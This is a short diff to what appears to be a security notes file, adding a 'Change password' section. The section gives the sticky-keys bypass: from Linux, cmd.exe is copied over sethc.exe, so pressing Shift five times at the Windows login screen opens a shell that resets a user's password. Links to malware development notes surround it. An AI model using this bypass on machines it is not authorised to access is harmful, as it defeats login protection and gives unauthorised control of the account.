@@ -4,9 +4,19 @@
 - https://0xpat.github.io/Malware_development_part_1/
 - https://itm4n.github.io/
 
-### Linux Trick
+### Change password (unlocked bios)
 
 - https://maggick.fr/pages/lost-windows-password.html
+
+```bash
+# boot linux
+mount /dev/sdax /mnt
+cp /mnt/Windows/System32/sethc.exe /mnt/Windows/System32/sethc_old.exe
+cp /mnt/Windows/system32/cmd.exe /mnt/Windows/System32/sethc.exe
+
+# boot windows + press shift 5 times
+net user user new_password
+```
 
 ### Malware
 
